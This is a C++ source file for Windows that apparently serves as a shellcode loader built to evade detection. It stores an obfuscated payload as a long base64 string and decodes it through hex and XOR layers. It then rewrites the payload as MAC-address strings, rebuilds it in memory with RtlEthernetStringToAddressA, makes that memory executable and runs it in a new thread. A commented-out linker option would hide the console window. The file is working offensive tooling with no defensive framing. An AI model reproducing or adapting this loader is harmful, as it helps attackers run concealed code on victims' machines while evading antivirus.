#include <iostream>
#include <Windows.h>
#include <utility>
#include <map>
#include <string>
#include <ip2string.h>
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#pragma comment(lib, "ntdll.lib")

using namespace std;

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(char const* bytes_to_encode, int in_len);
std::string base64_decode(std::string& encoded_string);
std::string string_to_hex(const std::string& input);
std::string hex_to_xor(const std::string& input);
std::string hex_to_string(const std::string& input);
map<int, string> MACEncode(const std::string& input);

int WINAPI WinMain(HINSTANCE hInstance,      // handle to current instance
	HINSTANCE hPrevInstance,  // handle to previous instance
	LPSTR lpCmdLine,          // command line
	int nCmdShow              // show state
)
{string shellcode = "NjBkNDFmNzg2Yzc0NTQ5YzljOWNkZGNkZGRjY2NlY2RjYWQ0YWQ0ZWY5ZDQxN2NlZmNkNDE3Y2U4NGQ0MTdjZWJjZDQxN2VlY2NkNDkzMmJkNmQ2ZDFhZDU1ZDRhZDVjMzBhMGZkZTA5ZWIwYmNkZDVkNTU5MWRkOWQ1ZDdlNzFjZWRkY2RkNDE3Y2ViYzE3ZGVhMGQ0OWQ0Y2ZhMWRlNDg0OTc5ZWU5ZWUxNzFjMTQ5YzljOWNkNDE5NWNlOGZiZDQ5ZDRjY2MxN2Q0ODRkODE3ZGNiY2Q1OWQ0YzdmY2FkNDYzNTVkZDE3YTgxNGQ0OWQ0YWQxYWQ1NWQ0YWQ1YzMwZGQ1ZDU1OTFkZDlkNWRhNDdjZTk2ZGQwOWZkMGI4OTRkOWE1NGRlOTQ0YzRkODE3ZGNiOGQ1OWQ0Y2ZhZGQxNzkwZDRkODE3ZGM4MGQ1OWQ0Y2RkMTc5ODE0ZDQ5ZDRjZGRjNGRkYzRjMmM1YzZkZGM0ZGRjNWRkYzZkNDFmNzBiY2RkY2U2MzdjYzRkZGM1YzZkNDE3OGU3NWQzNjM2MzYzYzFmNjljZDUyMmViZjVmMmY1ZjJmOWU4OWNkZGNhZDUxNTdhZDAxNTZkZGQyNmQwZWJiYTliNjM0OWQ0YWQ1NWQ0YWQ0ZWQxYWQ1Y2QxYWQ1NWRkY2NkZGNjZGQyNmE2Y2FlNTNiNjM0OTc1MGY5YzljOWNjNmQ0MTU1ZGRkMjQ3MThhOWM5Y2QxYWQ1NWRkY2RkZGNkZjY5ZmRkY2RkZDI2Y2IxNTAzNWE2MzQ5NzdlNWM3ZDQxNTVkZDRhZDRlZDUxNTQ0ZDFhZDU1Y2VmNDljYWU1YzE4Y2VjZWRkMjY3N2M5YjJhNzYzNDlkNDE1NWFkNDFmNWZjY2Y2OTZjM2Q0MTU2ZDI2ODM5YzljOWNmNjljZjQxY2FmOWM5Y2Q1MTU3Y2RkMjU5ODljOWM5Y2RkMjZlOWRhMDIxYTYzNDlkNDE1NmRkNDE1NDZkNTViNWM2MzYzNjM2M2QxYWQ1NWNlY2VkZDI2YjE5YTg0ZTc2MzQ5MTk1YzkzMTkwMTlkOWM5Y2Q0NjM1MzkzMTgxMDlkOWM5Yzc3MmY3NTc4OWQ5YzljNzQxZTYzNjM2M2IzZmVmM2YzZThlZmU4ZWVmZGVjYjFhZWIyZjFmNWYyYjJmNmVmOWM1OGI5MjcxM2MwMzEwYmNjMzE5YTIxNGEwMjQ1OGQ3NmUxMjU0YThjNDJiOGVkNzBjYTVlYmIwZjhlNDdiMWFiMmM3MjY2NDM1ZmY1MWRjMzBmYmE5NjE3Mzc5Y2E5NjFmM2M5MDc3NWJiMmQ1MzI2MDNmYmRiOWNjOWVmZjllZWIxZGRmYmY5ZjJlOGE2YmNkMWYzZTZmNWYwZjBmZGIzYTliMmFjYmNiNGZmZjNmMWVjZmRlOGY1ZmVmMGY5YTdiY2QxY2ZkNWQ5YmNhZGFjYjJhY2E3YmNjYmY1ZjJmOGYzZWJlZmJjZDJjOGJjYWJiMmFjYTdiY2Q1ZjJmYWYzY2NmZGU4ZjRiMmFmYTdiY2IyZDJkOWM4YmNkZmQwY2ViY2FmYjJhZGIyYThhY2FiYWFhYmE3YmNjOGVlZjVmOGY5ZjJlOGIzYWFiMmFjYTdiY2Y5ZjJiMWQ1ZDJiNTkxOTY5Y2U2MTBkMTI2NzhiN2IxOTJiMGZmODE2ZDdiYjllNmY5NDk5OGVmZWI0YjIxNWViYmVjZGMzOTk0Nzc5NmEyYTRmMmQ2NzIyODBmMTUzYjAwOGY0OWE1MDhkYzMyZTFlNGE3NTBmM2M1YTM1M2E1YmI3YjFjNDYwYTMxMTg3YTNjNWM2OWViMTAyN2I0MjlkYmExN2MzZDNhN2MxZmM2MzFiNjU0MTIxMWJmMzI4ZjgzMzdjZmMwMWNiODA2MGUwNjgxZjZhZmYzMGVmNjhkM2E1MGYwZDZhMzRkNTY4NTFjYTFiOWZlOTI5NjVhNzg5ZDc0Y2NiZjE1MmQ5YTRkNzJmMTNmOTUyMWE1ZjA1NzU0MjExMTYxZWRjZjEyYWNkZDk3NWRlMjQ5YjA5ZWEyZTViOTYwYmU2YTVmMTRiODMyZWJmYjAzYzgxMTk2YzQ2YjYwM2RlMjVlNjljMTg4YjA0MTkzNGFlODAzNjc1Njg2ZDE5Y2RkMjI2YzI5M2VjYTYzNDlkNGFkNTUyNjljOWNkYzljZGQyNDljOGM5YzljZGQyNWRjOWM5YzljZGQyNmM0MzhjZjc5NjM0OWQ0MGZjZmNmZDQxNTdiZDQxNTZkZDQxNTQ2ZGQyNDljYmM5YzljZDUxNTY1ZGQyNjhlMGExNTdlNjM0OWQ0MWY1OGJjMTk1Y2U4MmFmYTE3OWJkNDlkNWYxOTVjZTk0YmM0YzRjNGQ0OTk5YzljOWM5Y2NjNWY3NGUzNjE2MzYzYWRhZGE4YjJhZGFkYTliMmFkYWFhOGIyYWRhOWFiOWM4NWY1M2MxMTYz";
    std::string decoded = base64_decode(shellcode);
    string str = string_to_hex(decoded);
    string sh3llc0de = hex_to_xor(str);
    string strsh3llc0de = hex_to_string(sh3llc0de);
    map<int, string> listMac = MACEncode(strsh3llc0de);


	int n = 1;

	LPVOID  ptr = VirtualAlloc(nullptr, listMac.size() * 6, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	LPVOID ptrTmp = ptr;
	for (auto strMac : listMac)
	{
		RtlEthernetStringToAddressA(strMac.second.data(), (PCSTR*)strMac.second.data(), (DL_EUI48*)ptrTmp);
		ptrTmp = (unsigned char*)ptrTmp + 6;
	}

	VirtualProtect(ptr, listMac.size() * 6, PAGE_EXECUTE_READWRITE, PDWORD(&n));
	HANDLE handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, 0, 0, 0);
	WaitForSingleObject(handle, -1);
	return 0;
}
static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}
//A\nB                          3
std::string base64_encode(char const* bytes_to_encode, int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';

    }

    return ret;

}

std::string base64_decode(std::string& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }

    return ret;
}

std::string string_to_hex(const std::string& input)
{
    std::string output;
    size_t len = input.length();

    map<char, unsigned int> char_to_int = {
    {'0',0x0},{'1',0x1},{'2',0x2},{'3',0x3},
    {'4',0x4},{'5',0x5},{'6',0x6},{'7',0x7},
    {'8',0x8},{'9',0x9},{'a',0xa},{'b',0xb},
    {'c',0xc},{'d',0xd},{'e',0xe},{'f',0xf}
    };

    for (unsigned int i = 0; i < len; i++)
    {
        unsigned int n1 = char_to_int[input[i]] * 0x10;
        i++;
        unsigned int n2 = char_to_int[input[i]];
        unsigned int n = n1 + n2;
        char c = (char)n;
        output += c;
    }

    return output;
}

std::string hex_to_xor(const std::string& input)
{
    int nLen = input.size();
    int nKey = (int)input[nLen - 1];
    std::string output;
    for (int i = 0; i < nLen - 1; ++i)
    {
        int nTmp = (int)input[i];
        int n1 = 0xff - (nTmp ^ nKey);
        char cTmp = (char)n1;
        output += cTmp;
    }
    return output;
}


std::string hex_to_string(const std::string& input)
{
    string m_strShellCode = input;
    std::string output;
    size_t len = m_strShellCode.length();
    map<unsigned int, char> char_to_int = {
    {0x0,'0'},{0x1,'1'},{0x2,'2'},{0x3,'3'},
    {0x4,'4'},{0x5,'5'},{0x6,'6'},{0x7,'7'},
    {0x8,'8'},{0x9,'9'},{0xa,'a'},{0xb,'b'},
    {0xc,'c'},{0xd,'d'},{0xe,'e'},{0xf,'f'}
    };

    for (unsigned int i = 0; i < len; i++)
    {
        if ((unsigned int)(m_strShellCode[i]) < 0x10)
        {
            output += char_to_int[0x0];
            output += char_to_int[m_strShellCode[i]];
            continue;
        }

        unsigned char c1 = (unsigned char)m_strShellCode[i] % 0x10;
        unsigned char c2 = ((unsigned char)m_strShellCode[i] - c1) / 0x10;
        output += char_to_int[c2];
        output += char_to_int[c1];
    }

    return output;
}

map<int, string> MACEncode(const std::string& input)
{
    string m_strShellCode = input;
    map<int, string> list;

    //补充0
    string strShellCode = m_strShellCode;
    uint32_t nLen = strShellCode.size();
    uint32_t nFill = 12 - (nLen % 12);
    for (uint32_t i = 0; i < nFill; ++i)
    {
        UCHAR cFill = '0';
        strShellCode += cFill;
    }

    //把字符的shellcode转换为MACshellcode
    uint32_t nUuidCount = strShellCode.size() / 12;
    for (uint32_t i = 0; i < nUuidCount; ++i)
    {
        UCHAR szBuf[18];
        int n = 0;
        for (int j = 0; j < 12; ++j)
        {
            szBuf[n++] = (&strShellCode[i * 12])[j++];
            szBuf[n++] = (&strShellCode[i * 12])[j];
            szBuf[n++] = '-';
        }
        szBuf[17] = 0x00;
        list[i] = (char*)szBuf;
    }

    return list;
}